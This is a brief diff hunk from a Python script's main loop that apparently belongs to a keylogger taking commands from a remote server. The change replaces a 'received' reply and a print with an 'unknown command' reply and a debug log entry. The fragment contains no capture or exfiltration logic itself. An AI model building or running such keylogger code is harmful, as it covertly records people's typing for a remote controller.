@@ -284,5 +284,5 @@ if __name__ == "__main__":
                     keylogger.stop()
                     break
                 else:
-                    keylogger.send_message_to_server("received")
-                    print(recv)
+                    keylogger.send_message_to_server("unknown command")
+                    logging.debug(f"unknown command: {recv}")
